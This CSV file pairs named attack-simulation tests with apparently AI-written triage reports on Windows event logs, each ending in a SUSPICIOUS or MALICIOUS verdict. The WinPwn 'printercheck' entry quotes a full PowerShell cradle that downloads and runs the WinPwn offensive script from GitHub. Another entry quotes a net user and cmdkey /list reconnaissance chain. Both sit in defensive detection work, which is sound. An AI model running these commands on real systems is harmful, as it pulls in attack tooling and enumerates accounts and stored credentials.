Directory Name,AI Response
Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy,"Upon analyzing the provided log entries from the PowerShell, System, Sysmon, Security, and Application logs, several indicators suggest suspicious activity that merits further investigation:

1. **PowerShell Activity**:
   - The PowerShell logs show the execution of `powershell.exe & {get-addefaultdomainpasswordpolicy}`. This command retrieves the domain password policy, which could be used for reconnaissance purposes. While this command might be used legitimately by domain administrators, its occurrence alongside other events requires scrutiny.

2. **Event Log Clearing**:
   - The System logs indicate that logs were cleared (`EventID: 104` for System and PowerShell channels) by the user ""admin_test"". Log clearing is a common tactic used by attackers to cover tracks and hinder forensic analysis.

3. **Suspicious Process Execution**:
   - The Sysmon logs reveal a series of executions involving `wevtutil.exe`, which is used to clear event logs (`CommandLine: ""C:\\Windows\\system32\\wevtutil.exe\"" cl ...`). The process `wevtutil.exe` is being executed with high integrity level by the user ""admin_test"", corresponding to the log clearing events observed.
   - Execution of `whoami.exe` and `hostname.exe` are noted. While these commands are sometimes used for legitimate administrative tasks, their use in a potentially compromised context could indicate attacker reconnaissance activity.

4. **Time Discrepancies**:
   - System and Security logs show time changes (`EventID: 4616`). While this could be legitimate, such changes should be verified to ensure they were done for a valid reason.

5. **Overall Assessment**:
   - The combination of PowerShell command execution, event log clearing, suspicious process executions (`wevtutil.exe`), and potential stealth measures like time changes signal unusual behavior. It is especially concerning that these actions were performed consecutively and correlate strongly with potentially malicious intentions.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Conduct a detailed review of user ""admin_test"" activity, including login times, IP addresses used, and any deviations from normal behavior.
- Verify if the PowerShell command and log clearings were part of approved administrative tasks or if they were executed with malicious intent.
- Analyze any lateral movement from this host and determine if other systems have been affected.
- Strengthen monitoring on this host and across the network for similar behavior.
- Consider restoring from a recent backup if compromise is confirmed and performing a thorough post-incident analysis to comprehend the attack vector."
WinPwn - generaldomaininfo,"Based on a thorough review of the provided logs, several indicators suggest potential malicious activity:

1. **Clearing of Event Logs**:
   - There are multiple instances of event logs being cleared (`EventID 1102` in the Security log and `EventID 104` in the System log). This activity, performed under the user `admin_test`, is often associated with malicious behavior as perpetrators tend to clear logs to cover their tracks.

2. **Suspicious PowerShell Activity**:
   - The PowerShell logs show execution of a script that downloads a file from an external repository (`S3cur3Th1sSh1t/WinPwn` from GitHub). The use of `iex(new-object net.webclient).downloadstring()` is a known technique used in PowerShell attacks for fetching and executing scripts directly from the internet, which is a red flag for malicious intent.

3. **Elevated Integrity Levels**:
   - Processes such as `wevtutil.exe`, `powershell.exe`, and others executed with high integrity levels indicate they were running with elevated privileges, potentially allowing for system changes or data access that should be restricted.

4. **Unusual Host and User Reconnaissance**:
   - Execution of commands like `hostname.exe` and `whoami.exe` suggest efforts to gather information about the host and logged-in user context. While these can be benign, when combined with other indicators, they often signify reconnaissance activities during an attack.

5. **Network and Process Anomalies**:
   - The involvement of `svchost.exe` and manipulation of system time (`EventID 4616`) without clear justification could suggest tampering activities linked to obfuscation or scheduled malicious tasks.

6. **Multiple Instances of Process Creation**:
   - Frequent creation and termination of processes related to `Microsoft Edge Update` (`MicrosoftEdgeUpdate.exe`) could be legitimate due to updates but can also signal malicious activity if updates are being spoofed or exploited.

**Assessment and Resolution**:
The indicators discovered, specifically the clearing of event logs, suspicious use of PowerShell with external script downloads, and elevated privileges, strongly suggest a breach or malicious activity. The attempt to fetch a script from a suspicious GitHub repository with potentially harmful commands solidifies this assessment.

Resolution: **MALICIOUS**

**Guidance on How to Proceed**:
- **Isolate the System**: To prevent further infiltration or data exfiltration, isolate the affected host from the network immediately.
- **Advanced Forensic Analysis**: Conduct an extensive forensic investigation on the host to identify any backdoors or malicious implants that may have been installed.
- **Review Network Traffic**: Analyze network traffic logs to identify any suspicious outbound connections that could indicate data exfiltration.
- **Update Security Controls**: Ensure all systems have up-to-date security patches, and review firewall and IDS/IPS rules for potential adjustments.
- **User Education and Review**: Provide security awareness training focusing on recognizing phishing attempts and suspicious behavior. Additionally, review and tighten administrative access policies.

These steps will help contain this threat and safeguard against future occurrences."
ESXi - VM Discovery using ESXCLI,"Based on the provided logs, a detailed analysis reveals multiple indicators of potentially malicious activity, specifically relating to the clearing of logs and unauthorized process executions. Here's the breakdown:

### Suspicious or Anomalous Behavior:

1. **Log Clearing Activity (Event ID 104 and 1102):**
   - **System and PowerShell Logs Cleared:** Both System and PowerShell logs were cleared by a user 'admin_test' on `2024-10-23 18:42:26`. This action is logged as Event ID 104 and is suspicious, as clearing event logs can be indicative of an attempt to cover tracks from any malicious actions performed prior.
   - **Security Log Cleared:** Similarly, Security logs were cleared as indicated by Event ID 1102. This is a strong indicator of potential compromise because attackers often clear logs to remove traces of their activities.

2. **Command-line Utility Executions (Sysmon Event ID 1):**
   - **Wevtutil Executions:** The process `wevtutil.exe` was executed multiple times with commands to clear event logs (e.g., `wevtutil.exe cl System`, `wevtutil.exe cl Security`, etc.). This supports the log clearing activity noted above.

3. **Malicious Command Execution (Sysmon Event ID 1):**
   - **Plink Execution with Command Injection:**
     - The command involving `plink.exe` includes parameters indicative of a potential backdoor or unauthorized access attempt. The presence of `AtomicRedTeam` in the file path suggests this may be related to a simulated attack scenario but still points to dangerous testing or exploitation.

4. **Execution of High-Integrity Processes (Sysmon Event ID 1 & 5):**
   - Multiple high-integrity level processes (e.g., `wevtutil.exe`, `wevtutil.exe cl System`, etc.) executed by the user `admin_test` align with attempts to manipulate or clear logs, an unusual activity for a standard operational environment unless part of a scheduled or approved forensic/IT management operation.

### Assessment:

These log entries collectively suggest that the user `admin_test` or processes running under their credentials engaged in activities aligned with typical attack vectors, specifically those designed to obfuscate actions taken on the system. The frequent invocation of `wevtutil.exe` to clear logs, and the presence of credentials seemingly involved in what appears to be lateral movement or command injection using `plink.exe`, expands the risk level significantly.

### Threats or Risks Identified:

- **Privilege Misuse:** Misuse of admin credentials to clear logs and execute unauthorized actions.
- **Potential APT (Advanced Persistent Threat):** The behavior is consistent with that observed in sophisticated attacks aimed at avoiding detection.
- **Compromise of Integrity:** Clearing security event logs compromises the ability to audit and identify unauthorized access or changes to the system.

### Guidance on How to Proceed:

- **Immediate Investigation:** Conduct a thorough investigation to determine how `admin_test` was able to perform these actions. Verify whether the user account was compromised or if it is part of a test/admin automation sequence.
- **Incident Response Activation:**
  - Quarantine affected systems if malicious activity is confirmed.
  - Gather full system memory dumps and disk images for offline analysis.
  - Review network logs, firewall, and IDS alerts for additional signs of intrusion.
  - Engage with a forensic team if available for a deeper analysis.
- **User Access Review:** Audit user permissions and segregate duties to minimize potential misuse of privilege accounts.
  
Final Resolution: **MALICIOUS**

The activities noted within these logs meet several criteria for malicious activity typically aligned with lateral movements and anti-forensic behaviors, which are critical in compromising systems stealthily."
WinPwn - printercheck,"### Analysis of Windows Event Logs:

The logs show a sequence of events during a short time span on ""Server002."" Here are the main observations related to potential suspicious or malicious activities:

1. **Process Execution and Command-Line Arguments:**
   - Several instances of `wevtutil.exe` are observed, which is a legitimate utility used to manage event logs. The commands executed were `cl` (clear logs), which seems aligned with the event of log clearance. This behavior, when seen in conjunction with Sysmon events, indicates an effort to tamper with logs, possibly to cover tracks after malicious actions.
   - A PowerShell command was executed to download and execute a script from a GitHub repository. This command is found in the PowerShell logs (`EventID: 600`) with the command line:
     ```
     powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); printercheck -noninteractive -consoleoutput}
     ```
     This is highly suspicious, as it shows that a script is downloaded and executed from an external, non-trusted source, suggesting a potential malicious compromise.

2. **Log Clearance:**
   - Multiple event logs, specifically the Security and System logs, have been cleared (`EventID: 1102` for Security and `104` for System logs). This action was executed by the user `admin_test`. Clearing logs without a valid administrative or troubleshooting reason can be indicative of attempts to hide specific malicious activities.

3. **Integrity Levels:**
   - Actions were executed under a high or system integrity level, suggesting that these processes had elevated privileges. This allows critical systems command execution and potential abuse for malicious objectives.

4. **Monitoring Software (Microsoft Edge Update) Execution:**
   - Several events related to the Microsoft Edge Update service executing tasks were noted, but these appear routine and align with normal system updates. 

### Assessment:

Based on the above analysis, the most concerning activities are:
- The PowerShell execution involving the download and execution of a script from an untrusted source.
- The clearance of several logs syncs up with these events, possibly to conceal unauthorized actions.
  
**Resolution: MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Isolate ""Server002"" from the network to prevent further potential spread of malicious activity.
   - Conduct a full malware scan focusing on the PowerShell scripts that were executed.
   - Start a detailed forensic analysis to determine the full extent of the activity, reconstruct any cleared logs if backups are available, and check for further unauthorized access.

2. **Long-Term Recommendations:**
   - Regularly monitor and review event logs for similar activities.
   - Implement stricter controls on PowerShell execution policies to prevent untrusted scripts from being run.
   - Increase security awareness among users about the risks of executing scripts from untrusted external sources. 
   - Review user access policies and limit elevated privileges to essential personnel only. 

With these steps, you can address the current issue while improving future defenses against similar attacks."
Security Software Discovery - AV Discovery via WMI,"Based on the log entries provided, I've conducted a detailed analysis to identify any suspicious or potentially malicious activities.

### Key Findings:

1. **Event Logs Cleared:**
   - Multiple entries indicate the clearing of event logs using the `wevtutil.exe` command. Specifically, `wevtutil.exe cl` was used to clear the ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"" logs.
   - **Security Log EventID 1102** indicates that the security log was cleared, referencing a specific user, `admin_test`. Clearing event logs is typically a red flag, often indicating an attempt to cover tracks.

2. **Use of High Integrity Level:**
   - Commands executed by `admin_test` run at a high integrity level, indicating administrative privileges. This warrants caution as the user/admin may have escalated privileges or manipulated security settings.

3. **WMIC Command Execution:**
   - A command was executed via `cmd.exe` to run `WMIC.exe`, querying antivirus products. While this could be legitimate if performed by a sysadmin, without context or previous need, it could indicate reconnaissance for security defenses.

4. **Svchost.exe and WmiPrvSE.exe Activities:**
   - These processes are normal Windows system processes, but their execution, especially close to suspicious activities, should be monitored for any unusual behavior or associations with anomalous events.

5. **Time Discrepancies:**
   - Time-related events suggest a system clock adjustment, which can be used to disrupt logs and events' timestamps. However, without further context, this alone is insufficient to determine intent.

### Conclusion:

Based on these findings, the logs exhibit behaviors often associated with suspicious or potentially malicious activity:

- The clearing of logs is particularly concerning and often suggests malicious intent to hide actions or a breach. 
- WMIC and event log clearing by an administrative user without other context or standing procedure appear suspicious.

Given these points, my assessment of the situation is:

- **Resolution: SUSPICIOUS**

### Recommendations:

1. **Immediate Review and Audit:**
   - Conduct a full audit of `admin_test` activities and scrutinize any other systems this user has accessed.
   - Review user access permissions and ensure log management and security measures are properly configured to monitor or alert on event log clearing.

2. **Security Incident Response:**
   - Begin an incident response procedure to investigate the potential compromise, checking for additional indicators of compromise (IOCs) across the network or related systems.

3. **Monitor and Improve Log Security:**
   - Implement stricter monitoring for log manipulation.
   - Ensure critical logs are forwarded and stored in a secure location where users lack the ability to alter or delete them.

By executing these actions, the system's security posture can be significantly improved, helping to prevent or mitigate future incidents."
File and Directory Discovery (cmd.exe),"After thoroughly analyzing the provided Windows event logs, the following key points stand out, which potentially indicate suspicious, malicious, or anomalous behavior:

1. **Event Log Clearing**: Logs indicate that multiple event logs were cleared by the user ""admin_test"" (Event ID 104 in the System logs and Event ID 1102 in the Security logs). Clearing event logs is a common tactic used by attackers to hide their tracks after a compromise.

2. **Use of Wevtutil**: The logs show usage of the `wevtutil.exe` command-line tool to clear logs, executed by ""admin_test"". This activity is highlighted by Sysmon events showing `wevtutil.exe` clearing logs for channels like ""System"", ""Security"", and ""Windows PowerShell"". This corresponds with the log clearing events mentioned above. 

3. **Suspicious CMD Execution**: There is a Sysmon event showing the execution of `cmd.exe` with a command line that seems to be recursively listing directories and capturing file information (e.g., `dir /s c:\`). This type of directory listing, especially when the output is redirected to a file, is a common information gathering technique used in an attack.

4. **High Integrity Processes**: Processes running with high integrity levels can indicate privilege escalation. The clearing of logs and the execution of commands with high privileges by ""admin_test"" suggest possible unauthorized use of admin privileges.

5. **Unusual Time Synchronization**: There are multiple time change events (Event ID 4616) indicating a back and forth switching of the system time. While in some scenarios this could stem from legitimate configuration updates, it can also be a tactic to disrupt event log timelines to hinder forensic analysis.

Given these observations, it seems there is a coordinated effort that reflects behaviors aligned with unauthorized system access and activity obfuscation. This includes log clearance, system reconnaissance commands, and potential privilege misuse.

**Resolution: SUSPICIOUS**

- **Immediate Actions**: Conduct a thorough investigation to identify the source and intent of the actions recorded. This should include checking:
   - The origin of the ""admin_test"" logins and their legitimacy.
   - Any unauthorized changes or configuration modifications within the system.
   - Examination of the machines and accounts associated with the ""admin_test"" for possible indicators of compromise.

- **Recommended Next Steps**:
   - Isolate the affected host(s) from the network to prevent further potential damage.
   - Secure all administrative accounts and audit their use.
   - Review and enhance logging configurations to prevent unauthorized clearing.
   - Conduct a broader investigation to see if this relates to any broader pattern of behavior within your network.

This determination underlines the need for close, ongoing monitoring and a more in-depth response to fully understand and mitigate the potential threats indicated by these logs."
System Time Discovery W32tm as a Delay,"Upon reviewing the provided Windows event logs, there are several indicators within these logs that warrant closer scrutiny due to potentially suspicious activities:

### Detailed Analysis

1. **Log Clearance Events:**
   - There are multiple events indicating the clearing of Windows event logs:
     - EventID `1102` in the Security log: This indicates that the security log was cleared.
     - EventID `104` in the System log: The event logs for the System and Windows PowerShell channels were cleared.
   - Log clearance, especially from critical logs like Security and System, is a significant indicator of potentially malicious activity. Attackers often clear logs to cover their tracks and hide evidence of their intrusion or malicious activities.

2. **Use of `wevtutil` to Clear Logs:**
   - The `wevtutil` command is used to clear event logs, indicating that this action was performed via command line utilities.
   - The use of `wevtutil.exe` by the user `SERVER002\admin_test`, an account with high integrity level, further supports the possibility of an insider threat or compromised account being used to hide actions.

3. **Time and Date Modification:**
   - Security log EventID `4616` shows a change in the system time. Such actions can be used to manipulate timestamps of files or logs, adding another layer of stealth to potential malicious activities.

4. **Privileged Account Activity:**
   - The account `admin_test` is actively used in clearing logs, executing system-level commands, and potentially manipulating time settings.
   - Such activity by a high-privilege user account is suspicious, especially when correlated with log clearance and time modifications.

5. **Normal Administrative Tools in Use:**
   - Usage of `whoami.exe`, `cmd.exe`, and other typical Windows utilities is observed. While benign in isolation, in the context of log clearance and time modification, their usage could be part of an exploration phase of unauthorized access.

6. **Process Execution:**
   - There's a substantial volume of processes related to Microsoft Edge Update, which generally seems to be legitimate software update activity, given the lack of anomalies associated with these process executions.

### Assessment and Conclusion

- **Suspicious Activity:** While some of the activities like Microsoft Edge Update processes appear benign, the combination of log clearances, alteration in system time, usage of administrative tools, and the execution of `wevtutil` by a high-privilege user points towards activities that could suggest an attempt to hide or manipulate logs to cover unauthorized actions.
  
- **Resolution:** **SUSPICIOUS**

### Recommendations and Next Steps

1. **Immediate Audit of `admin_test` Account:**
   - Conduct a thorough review of recent activities tied to the `admin_test` account to determine if the account is compromised or if these actions were authorized.

2. **Extended Log Investigation:**
   - Investigate further historical logs (if available) to discern any correlating patterns or external connections during the subject timeframe.

3. **Enhanced Monitoring and Alerts:**
   - Implement monitoring for key actions like log clearance, time modification, and privileged user access to detect potential malicious actions in the future.

4. **Security Policy Review:**
   - Examine existing security protocols, particularly around logging and administrative access, and enhance them to prevent unauthorized log clearance and system manipulation.

Given the presented evidence, further internal investigation is justified to assess the genuine risk and gauge whether this incident suggests a larger compromise."
Adfind - Query Active Directory Groups,"Based on a thorough analysis of the provided logs, here are the key observations and assessment:

### Security Log Observations:
1. **Event ID 1102**: Indicates the Security Event Log was cleared by the user `admin_test`. This action is often suspicious because attackers clear logs to cover their tracks.
2. **Event ID 4624** and **Event ID 4672**: Show a successful logon with special privileges assigned to the `SYSTEM` account, using `SeDebugPrivilege` among others. While not inherently malicious, this should be contextualized with surrounding activity.

### Application Log Observations:
- **Windows Defender Activity**: Logs indicate that Windows Defender is enabled and operational, which is typically a sign of maintained system security.

### Sysmon Log Observations:
- **Process Activity**:
  - Multiple instances of `wevtutil.exe` are invoked with commands to clear event logs across different channels (`Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, `Windows PowerShell`). The execution was initiated by `admin_test`. This aligns with an attempt to erase traces of activity, which is highly suspicious.
  - Invocation of `cmd.exe` with a path indicating use of `AdFind.exe`, a known tool often utilized for gathering Active Directory data by attackers (part of Atomic Red Team Red Teaming framework). This strongly suggests malicious intent.
  
### System Log Observations:
- **Event Log Cleared**: Similar to security logs, highlights that system logs were cleared, reinforcing the attempt to hide malicious activity.

### Conclusion and Resolution:
The pattern of clearing various logs, combined with the invocation of AdFind through a command shell scripted by `admin_test`, and the use of process privileges, strongly suggests unauthorized and potentially malicious activity.

### Resolution: MALICIOUS

### Guidance:
1. **Immediate Action Required**:
   - Isolate the host (`Server002`) from the network to prevent further potential spread.
   - Preserve all current logs and state for further forensics.
   - Identify and potentially terminate any unauthorized sessions or processes running under the `admin_test` account.
2. **Further Investigation**:
   - Deep dive into log entries leading up to the period of interest for any additional preparatory actions.
   - Analyze potential ingress points or vulnerabilities exploited by the attacker.
3. **Remediation**:
   - Conduct a comprehensive review and patching of system vulnerabilities, particularly focusing on credential security and lateral movement techniques.
   - Consider a full rebuild of host systems if critical breaches are confirmed.
4. **Preventive Measures**:
   - Implement stricter logging policies, including log forwarding and retention strategies.
   - Educate and enforce security protocols to avoid misuse of admin privileges and get alerts for critical actions like log clearance. 

This assessment indicates a determined attempt of system compromise requiring immediate containment and comprehensive forensic review."
Hostname Discovery (Windows),"Upon thorough review of the provided Windows event logs, several key elements indicate potential concerns worthy of further investigation:

1. **Event Log Clearing**: Multiple entries indicate the clearing of event logs. Specifically, the System, Security, and Windows PowerShell event logs were cleared by a user named ""admin_test"". Log clearing, especially when performed by an administrative account, can be an indication of concealment of malicious activities or unauthorized actions.

    - **System Log Entry** (EventID 104): Indicates that the System and Windows PowerShell logs were cleared by ""admin_test"".
    - **Security Log Entry** (EventID 1102): Indicates that the Security log was also cleared by ""admin_test"".

2. **Use of Wevtutil.exe**: The `wevtutil.exe` utility was executed multiple times to clear the logs. The use of `wevtutil.exe` with the `cl` (clear log) command by the admin account is consistent with the log-clearing events noted.

3. **Presence of High-Integrity Processes**: The use of high integrity level processes by ""admin_test"" and the execution of sysadmin tools like `wevtutil.exe`, `conhost.exe`, and `cmd.exe` without clear justification can be suggestive of privilege escalation or an attempt to operate stealthily. 

4. **Time Change Events**: There are several events indicating changes to the system time (EventID 4616). While time adjustments can occasionally be legitimate (e.g., NTP corrections), on the same timestamp with subsequent log manipulation could indicate an attempt to obfuscate activities in the logs.

5. **Elevated Privileges**: The active privileges for the user ""admin_test"" include several sensitive privileges (such as SeDebugPrivilege, SeBackupPrivilege), which are often targeted or exploited during privilege escalation attacks.

Considering these findings:

- **Log clearing events performed by a user with elevated privileges** can indicate possible malicious intent, especially in conjunction with the use of tools known for system and log file manipulation (`wevtutil.exe`).
- **Unjustified changes to system clock** settings can be a tactic used in circumventing security measures or time-stamping logs improperly.

**Resolution**: The activity observed in the logs is considered **MALICIOUS** due to intentional log clearing and the invocation of potentially sensitive administrative-level operations without clear, legitimate purpose, potentially indicating an attempt to cover up unauthorized actions.

**Recommendation**:
- Conduct a thorough security review of the user account ""admin_test"" to determine if it was compromised.
- Audit and reinforce access control and user privilege policies to prevent unauthorized alterations.
- Review any other security measures or alerts that may provide insights into unauthorized access or behavior during the timeframe.
- Consider re-imaging the affected systems if it’s confirmed that a compromise occurred to ensure no residual artifacts remain."
Reg query for AlwaysInstallElevated status,"In reviewing the provided logs, several events stand out that could indicate suspicious or malicious activity:

1. **Log Clearing Activity**:
   - The event logs show multiple instances of the `wevtutil.exe` process being used to clear event logs ([Sysmon EventID: 1](#17924, #17932, #17936, #17948)). Log clearing is typically associated with attempts to conceal malicious activity.
   - Three specific channels were cleared: System, Security, and Windows PowerShell, all within a few seconds interval (System Log EventID: 104, Security Log EventID: 1102). The user `admin_test` initiated these actions, which is suspicious and typical of an attacker attempting to erase traces.

2. **Registry Query for `AlwaysInstallElevated`**:
   - The `cmd.exe` process executed commands querying registry values related to `AlwaysInstallElevated` (Sysmon EventID: 1, #17952). This setting can allow non-administrative users to install software with elevated privileges, making it a potential vector for privilege escalation.

3. **Credential Access Attempts**:
   - A series of Security Audit events ([EventID: 5379](#30335, #30341)) indicates unsuccessful attempts to read credential-related information. Though these attempts returned error code 3221226021, possibly indicating permission denial, frequent credential access attempts can indicate credential harvesting or other attack vectors.

4. **Windows Update Processes**:
   - A range of update-related processes, including `wuauclt.exe`, `AM_Delta.exe`, and `MpSigStub.exe` were executed around the same timeframe ([Sysmon EventID: 1](#17961, #17962, #17963)). While these can be related to legitimate system updates, they merit correlation with known update schedules to rule out masquerading activity.

### Conclusion:
The highlighted activities, especially the clearing of event logs and registry queries for potentially dangerous configurations, are indicative of suspicious behavior that could be part of a larger, coordinated malicious activity. The logs present a strong indication of an attempt to cover tracks post potential execution and privilege escalation.

### Resolution:
**SUSPICIOUS** - The activities observed are consistent with tactics, techniques, and procedures (TTPs) commonly used by adversaries to carry out and cover up malicious actions. These findings merit further investigation, particularly into the reasons for event log clearing by `admin_test`, examination of the `AlwaysInstallElevated` registry settings, and correlation with other logs or threat intelligence for context and confirmation. Immediate steps should include monitoring account activities, reviewing user permissions, and performing a thorough system scan for any anomalies."
Enumerate all accounts on Windows (Local),"Upon reviewing the provided event logs from various Windows subsystems, I have identified several events and patterns that suggest suspicious activity, though not definitively malicious without further investigation.

### Key Observations:

1. **Log Clearing Events:**
   - **Security Event Log (ID 1102)**: The security log was cleared by the user `admin_test`. This is often associated with attempts to conceal malicious activity.
   - **System Event Log (ID 104)**: The system logs were also cleared by the same user, `admin_test`. Clearing logs is typically an action taken to hide traces of unauthorized or malicious activity.

2. **Process Execution and Unusual Command Line Activity:**
   - Multiple instances of `wevtutil.exe` were executed, all involving operations to clear logs (`cl` command), suggesting intentional log manipulation.
   - An anomalous command string `""cmd.exe"" /c net user & dir c:\\Users\\ & cmdkey.exe /list & net localgroup ""Users"" & net localgroup` was observed. This command chain is indicative of reconnaissance-like actions that one might perform to gather system and user information.

3. **Security Events:**
   - Time synchronization events (IDs 4616, 4616): Sudden changes in time can be linked to various tactics like attempting to manipulate timestamps, though more context is needed here to determine intent.
   - Credential access event (ID 5379) with a non-zero return code indicates an attempt to access credentials failed, suggesting unauthorized access attempts.

4. **Use of `cmd.exe` for Multiple Commands:**
   - The specific sequence of commands run via `cmd.exe` indicates attempts to enumerate users and groups, possibly inspecting the credentials or permissions setup, which is a common step in lateral movement strategies.

### Assessment:

- The consistent pattern of log clearing (security, system) especially by a user `admin_test`, along with the execution of sensitive command-line operations, raises significant concern.
- The sequence of commands implies reconnaissance and potential preparation or execution of lateral movement tactics.
- While these actions are consistent with potential malicious behavior, there is no direct evidence of harm, modifications, or data exfiltration.

### Resolution:

- **Resolution: SUSPICIOUS**

### Recommendations for Next Steps:

1. **Immediate Actions:**
   - Temporarily disable or closely monitor the account `admin_test` and investigate its activity logs.
   - Review system integrity and ensure that the malware isn't currently active or spreading.

2. **Further Investigation:**
   - Investigate the surrounding context for the log clear events, especially focusing on actions leading up to and following these events.
   - Perform root cause analysis on why specific commands were executed with `cmd.exe` and verify the intentions.
   - Check for other potential anomalies that were not included in the logged data but could be indicators.

3. **Monitoring and Detection:**
   - Enhance monitoring on `Server002` and other critical systems for similar patterns of behavior, focusing on process execution and more advanced alerts on log state changes.
   - Implement tighter access control and audit logging configurations to detect and prevent future potentially malicious activity.

This assessment suggests that while direct malicious actions were not confirmed, the activities recorded align with potential threat actor methodologies, and thus warrant a deeper investigation."
Adfind - Enumerate Active Directory Computer Objects,"Based on the logs provided, here's a detailed analysis and assessment:

1. **Log Clearing Events**: 
   - **Event ID 1102** from the Security log and **Event ID 104** from the System log indicate the clearing of the Security, System, and Windows PowerShell logs. The logs were cleared by `admin_test` on `Server002`. Clearing event logs, especially without any corresponding legitimate maintenance or operational task, can be an indicator of malicious behavior trying to cover tracks.

2. **Privilege Assignment**:
   - **Event ID 4672** shows that the SYSTEM account was assigned special privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, among others. This is a standard privilege assignment for the SYSTEM account but should be monitored carefully, especially if seen in conjunction with other suspicious activities.

3. **Use of PowerShell**:
   - **Sysmon Event ID 1 and 5** for `powershell.exe` execution. PowerShell usage is common, but when logs are being cleared simultaneously, it raises concern. No specific malicious command was logged, but since this event aligns with log clearing, it should be investigated further.

4. **Abnormal Process Creation**:
   - An execution of `cmd.exe` with an unusual path to `AdFind.exe` (**Sysmon Event ID 1** for process 5456, `cmd.exe`) in a temporary directory suggests possible reconnaissance activity. AdFind is a known tool used for querying Active Directory; its use in this context is suspicious and warrants further investigation.

5. **Repeated Credential Request Failures**:
   - Events like **Event ID 5379** from the Security log that repeatedly attempt to read credentials for `MicrosoftAccount:user=02txoixylodcstop` with failures, suggest possible unauthorized access attempts.

6. **Other Processes**: Events from Sysmon show the execution of various typical system processes (`wuauclt.exe`, `MpSigStub.exe`, etc.) which align with typical system functions and scheduled tasks. These do not raise immediate concern.

### Conclusion:

Given the evidence:

- The clearing of logs by `admin_test` without evident legitimate context, paired with command-line usage and the execution of a recognized reconnaissance tool, signals suspicious activity.
- The attempts to access credentials repeatedly and failures further escalate the need for investigation.

**Resolution: SUSPICIOUS**

### Next Steps:

1. **Immediate Investigation**: Contact the user `admin_test` to determine the legitimacy of their actions related to the log clearing.
2. **Access Review**: Review access logs and authenticate sessions for `admin_test` around the time of suspicious activities to ensure there are no unauthorized access points.
3. **Tool Analysis**: Investigate any evidence of `AdFind.exe` usage and determine if it was used for legitimate administrative tasks or reconnaissance.
4. **Security Controls Check**: Verify and reinforce security controls around log management and privileged account usage.
5. **Monitor and Isolation**: Increase monitoring of `Server002` for any further suspicious activities and consider network isolation if necessary anomalies are detected.

This assessment warrants more thorough investigation to ensure the security of the environment."
Enumerate All Network Shares with Snaffler,"Based on the analysis of the provided Windows event logs, several signs of potentially suspicious or malicious activity were identified:

1. **PowerShell Events**:
   - Multiple PowerShell events indicate the execution of a PowerShell command involving `invoke-expression` with cmd and the execution of an executable (`Snaffler.exe`) from a temporary location. Using `Invoke-Expression` is notable as it can be used to obfuscate PowerShell commands, often seen in malicious operations.
   - This command attempts to run `Snaffler.exe` to output data to a temporary file. `Snaffler` is a known tool used for gathering data from network shares, typically used in red teaming or potentially by threat actors for information gathering.

2. **Encoded PowerShell Commands**:
   - Another notable observation includes commands executed using encoded PowerShell commands (`-encodedCommand`). This is a common technique used to obscure PowerShell commands from detection by avoiding plain text execution, often seen in malicious activities.

3. **Log File Clearing**:
   - The logs show events indicative of clearing Windows Event logs, which is often done to cover tracks and hide malicious activity. The logs that were cleared include security, system, and application logs (`Event IDs: 1102, System, PowerShell`).

4. **Sysmon Observations**:
   - Sysmon logs indicate the process execution of `cmd.exe` and multiple instances of PowerShell with activities that align with potentially suspicious behavior such as launching scripts and executing encoded commands. 
   - The consistent pattern of launching `Snaffler.exe` via PowerShell and cmd, followed by clearing of event logs raises concern.

5. **Privileged Account Usage**:
   - The account `admin_test` has been observed with elevated privileges being used to execute these actions, which could be indicative of the account being leveraged for malicious activities if not part of standard operating procedures or not authorized for such usage.

6. **Security and Application Log Entries**:
   - The security logs show logins, including privilege escalation (`Event ID 4672`) by `admin_test`. This is consistent with an attacker gaining and using administrative privileges.
   - Security auditing events further corroborate this activity with administrative actions being logged.

In summary, the series of PowerShell executions involving encoded commands, use of `Invoke-Expression`, execution of a network discovery tool from a temporary directory, subsequent clearing of logs, and use of a privileged account suggest potentially malicious activity. The pattern and tools used are consistent with techniques employed in lateral movement or reconnaissance phases of an attack.

**Assessment**: **MALICIOUS**

**Guidance**:
- **Immediate Investigation**: This activity necessitates immediate investigation to determine the extent of the intrusion, how access was obtained, and if any data was exfiltrated or additional malicious activity was conducted.
- **Contain and Remediate**: Isolate the affected host, disable the `admin_test` account temporarily, and reset credentials.
- **Forensic Analysis**: Conduct a thorough forensic analysis of the host to gather more evidence on how the breach occurred.
- **Review and Strengthen Security**: Review user permissions, implement monitoring for abnormal PowerShell activity, and ensure endpoint protection and intrusion detection systems are properly configured and updated."
Enumerate Active Directory Computers with ADSISearcher,"Based on an in-depth investigation of the provided Windows event logs from multiple logs (PowerShell, Sysmon, Security, System, and Application logs), the following findings and assessment of the situation are presented:

1. **PowerShell Logs:**
   - The PowerShell logs contain entries indicating the execution of commands related to Active Directory Service Interfaces (ADSI), specifically the queries to find objects in the ""objectcategory=computer"". This usage, while indicative of directory-related queries, is not inherently malicious. However, the breadth of the query and its execution on a console host suggest it needs scrutiny if not routine and expected for the environment.

2. **Sysmon Logs:**
   - The Sysmon logs reveal the frequent usage of `wevtutil.exe` command, particularly for event log clearing actions, notably targeting various logs (e.g., Application, System, Security). This behavior often correlates with attempts to cover tracks post-compromise. The parent process for `conhost.exe` being `wevtutil.exe` suggests command line activity directly from event utility execution.
   - Multiple processes and the clearing of logs point to attempts of log manipulation, which are common in malicious activities. Frequent launching and exiting of high-integrity level processes (`svchost.exe`, `conhost.exe`) are present, but they often occur in normal system operation. Pure frequency alone without anomalous parent-child process chains does not confirm malicious intent.

3. **Security Logs:**
   - There is a notable event (Event ID 1102) indicating the security log was cleared via `admin_test` account. Log clearing is a critical event often employed in malicious activities to hide traces. Moreover, numerous credential-related events (Event ID 5379) show attempts to access what seems to be redundant logins likely for Microsoft accounts, all returning error codes indicating failure.
   - Elevated token events with sensitive privileges (Event ID 4672) for NT AUTHORITY\SYSTEM indicate standard system process behavior and are not directly linked to the malicious activity without evidence of misuse or unauthorized access.

4. **System Logs:**
